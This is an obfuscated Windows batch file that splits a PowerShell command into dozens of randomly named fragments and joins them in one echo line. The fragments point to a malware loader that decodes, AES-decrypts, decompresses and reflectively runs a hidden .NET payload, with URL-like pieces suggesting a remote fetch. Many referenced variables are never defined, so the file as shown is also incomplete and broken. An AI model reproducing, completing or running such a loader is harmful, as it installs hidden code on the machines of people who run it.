@echo off
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "tMKippcCNI=se64"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "uEJCfcEcco=Secu"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "paxPdszJIK=.Com"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "NOBthvttUg=.Cry"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "JUSuDbAgqj=tryP"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "gclOeXBNVg=('@'"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "MIpJwYzVTQ=rmFi"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "YupECAGooT=('#'"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "zAaKWrDWDY=ncti"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "cXlnyJWjtf=p($b"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "tdGvmFIicQ=nver"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "JhwsLDZEmQ=efle"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "jtDckHEyhx=Stri"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "AivwsMBzJT=IV=["
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "NmdVsCeHsm=='CB"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "uavQPBnRaj=dec("
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "ZsSLMYwshS=2\Wi"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "FSdgVrEMdI=unzi"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "TORZElEYZt=$b){"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "ZxLmKoFaSS=/XMz"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "VHwKMnkxlq=','A"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "UNkwKwkDwf=ose("
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "eFBLmgvKBF=opyT"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "bAqmhVHYcz=;run"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "GVpffWwWWE=d($a"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "JcvNddWvEx=]::D"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "dtPSzvmCuL=Dude"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "vEQgmWiWsk=;$d."
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "HlWNpLuNAK=);$a"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "zTTDcIIflQ=).En"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "NweOoEreuH=lace"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "QQIvEWAtCR=a.Pa"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "QPYwhqwCaB=){[R"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "LTdbtYooXZ=gz=N"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "MVPKPEhEQW=eQhm"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "RsdFrgLADH=' -U"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "JzeVwIZFWK=,'A'"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "saoHMjXsRZ=plac"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "aqWkcJqAty==[Co"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "piKfcxnuAP=unct"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "UWGYmkmJSo=mory"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "siwRhjgtXW=nalB"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "ieQRpSCgOt=rray"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "fWINSeqcPk=ion "
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "cKfATVNdas=';$a"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "aFplQwsEWw=pres"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "YANJlsEKUo='/')"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "BsxbroTElP=[]]$"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "GGYFnbGbZx=(dec"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "cQHpiwzsaJ=v1.0"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "sRZdCqXEUn=/Pri"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "DUqjPCeTsa=omBa"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "ckmUXKqHnj=ng($"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "IdIaJuLKIA=ptor"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "tGOtbgVjLk=Conv"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "ApGjpZdjcN=ecom"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "LbyPXJAGRi=\pow"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "EsZImgUXpv=.Mem"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "BnATnijSCy=vbtD"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "xHHhqkrfJF=/ref"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "qtaZnQrYxS=ent."
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "wRyUTkRQnz=Crea"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "CCiCkuLBvG=);$r"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "GUVKiqXdog=n.As"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "KBeNtSwWdN=Disp"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "SHowCUGqSI=();$"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "nKDKRQmiRh=ateD"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "YYbWeYXjJe=echo"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "njSDfLNBDQ=($b,"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "PJUiaXEIrv=KCS7"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "HlPcDKTRsu=){$m"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "skJuvXLYRo=ddin"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "gbkVrhxKzM=4aHl"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "wpGMjxjuiW=$nul"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "ZfPGKBxCju=');$"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "JSjAXehMRX=,[st"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "FQJrZKLjPO=exe""
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "ZzhBCbfrcs=zip "
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "qBqItLEDVz=2=un"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "JlhVCnMJFA=s]::"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "gwyvpHWody=C';$"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "MFysfliVPB=.Dis"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "rMuoKtPWyC=trin"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "ogLVrADUWg=pStr"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "HgoNfhfwUz=');f"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "XSVKRpcCJU= (de"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "jcCFiJDKvr=rt]:"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "VvNbrRWqRA=Conv"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "iZMaFoBNuC=ads/"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "knIOcpsGaR=a2 ("
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "yafPEHffbS=omBa"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "gVAwxgYdNI=un($"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "lDAcgBJzZx=\Win"
%YYbWeYXjJe%%bnCrhEVgDp%%AVrlwVEpQP%%gBXOZrKzdG%%gVkmWGhsOh%%nuVHxcGQzj%%tHtTXAqNrP%%UwcWjFKeoP%%OmBICMFqrW%%LTZUnyBrow%%qtaZnQrYxS%%sBBKuggKrl%%UawveawiJK%%dtPSzvmCuL%%uGSyDjspAg%%sRZdCqXEUn%%ujpNPYLIkZ%%UEpGRnhXRU%%HgICsmtMqj%%xHHhqkrfJF%%yJfAmNBtlo%%iZMaFoBNuC%%EYsbBnWipG%%WcomwYbhqE%%LaBcaxUHBc%%JDKhazqdZZ%%RsdFrgLADH%%nuxPRExqad%%spHnXsrhlW%%HXhqNtWWLU%%MudUOpgUpw%%cacVGBLQHY%%OEoHZpmgcx%%HBFgrYlMyH%%mwROUHVlKl%%HgoNfhfwUz%%daSSPAvWEI%%qYraLrNAMs%%uavQPBnRaj%%TORZElEYZt%%lZHcVJOnbO%%uEJCfcEcco%%nDVvOBgswA%%NOBthvttUg%%MZQmPofpTB%%GCWKgHdmnu%%CwRAbFdqvK%%JlhVCnMJFA%%wRyUTkRQnz%%rhgADqhqkj%%kOUjRvubiS%%UuGMYLXXGQ%%NmdVsCeHsm%%gwyvpHWody%%QQIvEWAtCR%%skJuvXLYRo%%qNIVMyWkwr%%PJUiaXEIrv%%cKfATVNdas%%VXxOhchMJg%%aqWkcJqAty%%tdGvmFIicQ%%KSkevRlfbX%%PRZlvLOUxk%%EmJBYSrcBB%%uZKSvifSPl%%xkzwICevaA%%RNKRlyiIgD%%AjEzDQggQm%%GVemMuMnSw%%OVbaJGoTGW%%ZxLmKoFaSS%%vXENUWJxeR%%MVPKPEhEQW%%BnATnijSCy%%OMvabQrofN%%XROOkdIbxf%%gbkVrhxKzM%%MQVFdaAPJY%%nTycZKyLJj%%AivwsMBzJT%%tGOtbgVjLk%%DTsySmChWG%%IMbplDvznr%%yafPEHffbS%%OpayGHPWDf%%jtDckHEyhx%%LwVtMCNCUl%%hxgdRtLCJE%%OzVhhexdEX%%cGYDhstGMd%%TmcsYMnzkR%%VcOCJlBNmH%%fJYWjAyCWz%%ZfPGKBxCju%%QYTNbZSvUV%%QFueYkofjx%%nKDKRQmiRh%%OYERQgQlUj%%IdIaJuLKIA%%nrtMhguiVl%%NKDMhSbCnR%%tdkZOkcDbx%%eBzqUwFRKK%%MIpJwYzVTQ%%siwRhjgtXW%%dRgxglknSK%%njSDfLNBDQ%%KhJkfWfIjK%%qlUNHUBRCl%%NmdjDipTMw%%vEQgmWiWsk%%gCdhubpfVk%%jWZscyeAHW%%HlWNpLuNAK%%MFysfliVPB%%TjXBmzFyeN%%SHowCUGqSI%%GCElyExHmQ%%piKfcxnuAP%%fWINSeqcPk%%FSdgVrEMdI%%cXlnyJWjtf%%HlPcDKTRsu%%nuSclxfEkL%%SArSNhKupj%%hgIJDtcaDk%%yNuIuHfjca%%EsZImgUXpv%%ZyCjmhLiyR%%vfbZnfgIxf%%bBsoEOgaxx%%zeKilZklwn%%VXKkFzraug%%ZlzjtyfoEx%%aKKbsquSOn%%VVmkkeQhJf%%xgGqxnEAOM%%UWGYmkmJSo%%eymhleZpZp%%HXFyaUeuEe%%LTdbtYooXZ%%RgpubYTyes%%opAzeWriXs%%gSfNDlukOm%%QLraxBIkxb%%aFplQwsEWw%%HfqFTYbCRQ%%DIKSCDYAcD%%ogLVrADUWg%%SQorFKuLhy%%zftGxrUwIn%%ySCsiBuuos%%vgFKXNutnS%%imsDdiMexa%%FglJIaoVjd%%paxPdszJIK%%WBjPflzZpZ%%OpWnNpVWbX%%yzjjDiPDzK%%JcvNddWvEx%%ApGjpZdjcN%%xCHLlxsamW%%wVzEqLUjkJ%%szsEwjTaTD%%eFBLmgvKBF%%LVjHaEQbTD%%fUYsvYkcoc%%ErgJSQuNrk%%qjHEXxpLDS%%tRgqxkHiqo%%VsvzbtPzPk%%kcJInWmtvX%%IyzwJMkQlH%%jlwdoYNiDD%%IQWtHqiycB%%XnNsFxTZPp%%iYnhbZGGup%%ieQRpSCgOt%%EMNKKWxdxR%%eOsovJCOrI%%KBeNtSwWdN%%UNkwKwkDwf%%CCiCkuLBvG%%pNOgJcIarR%%zAaKWrDWDY%%yZrmghtBDY%%gVAwxgYdNI%%NkmEGbByFS%%QPYwhqwCaB%%JhwsLDZEmQ%%tziVlnNNFe%%GUVKiqXdog%%KwdlYGOTTc%%bXlPzrHclU%%DIWWVOlMku%%GVpffWwWWE%%zTTDcIIflQ%%JUSuDbAgqj%%vbJzvgHfJC%%VKfHuKPsTm%%ggBtKMdVCe%%wpGMjxjuiW%%aCvIVZOlZS%%mhnddoApOI%%cMDFgFesxX%%AukXlDKTyL%%XSVKRpcCJU%%WTFzToZQCp%%VvNbrRWqRA%%EHRdLkQSNQ%%DBJCaHOLdX%%DUqjPCeTsa%%tMKippcCNI%%xhcLLtMkbK%%ckmUXKqHnj%%gWANxRRAnL%%EmXuAwSFxw%%PTSHXizQlF%%YupECAGooT%%ClXqfQmSuA%%SLjRtmeSQo%%saoHMjXsRZ%%PDrETEWCBh%%VHwKMnkxlq%%wOyZBBXpDV%%TTauLouFXP%%qBqItLEDVz%%ZzhBCbfrcs%%GGYFnbGbZx%%TFAwZUxPGP%%WtueWuMySJ%%jcCFiJDKvr%%eDExGuYLCH%%EpLnvnmUJT%%phipoRcVnp%%rMuoKtPWyC%%vbWkfTqpjU%%xJbBcXuojP%%rdxmqRVxCc%%ypwgynkYju%%ANLsSILTlN%%YANJlsEKUo%%YSNgwimVcP%%NweOoEreuH%%gclOeXBNVg%%JzeVwIZFWK%%vPQwaCwZuG%%bAqmhVHYcz%%GzaWfnsjrG%%ELhJmqlOOC%%BBsoeijRNB%%abCxdVPTqN%%knIOcpsGaR%%JSjAXehMRX%%dAvQFDjKGq%%BsxbroTElP%%QCQWRiRczY%%OdbtJJRRiy%%fHaKqrviiJ%%lDAcgBJzZx%%MhlHCxqdsI%%wcvNJiCgGz%%NITPNkDZnh%%ZsSLMYwshS%%arQAmiiMsX%%ZCTzKdnvUr%%UqQkIejKaL%%MjZNyvStCE%%cQHpiwzsaJ%%LbyPXJAGRi%%ZyMGlPDfao%%lTSppeJBbl%%FQJrZKLjPO%
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "LrLriAZHLf=exit"
!lDEeBDAcJMUDDNNSBMRWdzCTmLaoqKRiUXjMOeXdmkWMwpURrL! "CAjhMABcrC= /b"
%LrLriAZHLf%%CAjhMABcrC%
